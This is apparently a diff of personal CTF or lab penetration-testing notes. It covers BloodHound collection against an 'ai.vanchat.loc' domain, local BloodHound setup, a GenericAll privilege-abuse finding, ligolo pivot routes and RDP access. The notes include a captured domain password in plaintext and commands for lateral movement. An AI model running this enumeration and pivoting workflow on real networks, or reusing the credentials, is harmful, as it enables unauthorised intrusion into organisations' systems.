@@ -917,9 +917,7 @@ This created the file:
 //If you have valid credentials but don't want to (or can't) drop a binary, use the Python collector entirely from Kali:
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
-pip3 install bloodhound
-# OR
-sudo apt install python3-bloodhound
+pipx install bloodhound
 
 bloodhound-python \
   -u 'username' \
@@ -929,19 +927,90 @@ bloodhound-python \
   -c All \
   --zip
 
+//Test
+bloodhound-python -u 'qw1.brian.singh' -p '_4v41yVd$!DW' -d ai.vanchat.loc -ns 10.200.171.122 -c All --zip
+
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-//Load into BloodHound on Kali
-# Start neo4j first
+// BloodHound Setup (local)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Step 1 — Fix PostgreSQL collation mismatch (first time only)
+//This happens after a glibc update and will block database creation if not fixed first.
+
+sudo systemctl start postgresql
+sudo -u postgres psql -c "ALTER DATABASE template1 REFRESH COLLATION VERSION;"
+sudo -u postgres psql -c "ALTER DATABASE postgres REFRESH COLLATION VERSION;"
+sudo -u postgres psql -c "ALTER DATABASE template0 ALLOW_CONNECTIONS true;"
+sudo -u postgres psql -d template0 -c "ALTER DATABASE template0 REFRESH COLLATION VERSION;"
+sudo -u postgres psql -c "ALTER DATABASE template0 ALLOW_CONNECTIONS false;"
+
+//Step 2 — Set Neo4j password
+Start neo4j and change the default password before running bloodhound-setup
+
 sudo neo4j start
+# Wait ~10 seconds, then open http://localhost:7474
+# Login: neo4j / neo4j
+# It forces a password change — set something and remember it
 
-# Then launch BloodHound
-sudo bloodhound &
+//Step 3 — Update the BloodHound config
+sudo vim /etc/bhapi/bhapi.json
 
-//Log in
-//(default creds: neo4j / neo4j)
-//You'll be prompted to change password, then drag-and-drop the .zip into the BloodHound UI.
+Update the neo4j secret to match what you just set:
+{
+  "database": {
+    "addr": "localhost:5432",
+    "username": "_bloodhound",
+    "secret": "bloodhound",
+    "database": "bloodhound"
+  },
+  "neo4j": {
+    "addr": "localhost:7687",
+    "username": "neo4j",
+    "secret": "YOURNEWPASSWORD"    <-- change this
+  },
+  "default_admin": {
+    "principal_name": "admin",
+    "password": "admin",
+    "first_name": "Bloodhound",
+    "last_name": "Kali"
+  }
+}
+
+//Step 4 — Run bloodhound-setup
+sudo bloodhound-setup
+# Answer Y if prompted
+
+//Step 5 — Launch BloodHound
+# Use the binary directly to avoid the setup loop
+/usr/bin/bloodhound &
+
+# UI will be available at:
+# http://127.0.0.1:8080
+# Default login: admin / admin
+
+
+//EXTRA: Quick launch (after first-time setup is done)
+sudo neo4j start && sudo systemctl start postgresql && /usr/bin/bloodhound &
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//Privilege Abuse
+BloodHound revealed that the compromised user qw1.brian.singh has GenericAll privileges over several domain users:
+	-qw1.glenn.burns@ai.vanchat.loc
+	-qw1.thomas.brennan@ai.vanchat.loc
+	-qw1.callum.murphy@ai.vanchat.loc
+	-qw1.sophie.shaw@ai.vanchat.loc
+	-qw1.alison.cook@ai.vanchat.loc
+	-qw1.stanley.ahmed@ai.vanchat.loc
+	-qw1.jonathan.payne@ai.vanchat.loc
+	-qw1.duncan.patel@ai.vanchat.loc
+	-qw1.lucy.fry@ai.vanchat.loc
+	-qw1.anne.clark@ai.vanchat.loc
+	-qw1.hannah.hardy@ai.vanchat.loc
+
+
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
@@ -995,13 +1064,12 @@ sudo ligolo-proxy -selfcert
 
 //Prompts
 Enable WebUI? → n  
-Allow CORS? → n
 
 You should now see:
 Listening on 0.0.0.0:11601
 
 //2. Transfer Agent to Target
-cd /home/kali/haxterm/data/SideQuest0/1-db
+cd ~/haxterm/data/SideQuest0/1-db
 
 which ligolo-agent
 /usr/bin/ligolo-agent
@@ -1021,10 +1089,10 @@ start
 //Add Routes
 sudo ip route add 10.200.171.101/32 dev ligolo
 sudo ip route add 10.200.171.122/32 dev ligolo
+sudo ip route add 10.200.171.102/32 dev ligolo
 
 
-xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.101:3389 /d:ai.vanchat.loc /u:qw1.brian.singh /p:'_4v41yVd$!DW' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
-
+xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.102:3389 /d:ai.vanchat.loc /u:qw1.brian.singh /p:'_4v41yVd$!DW' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
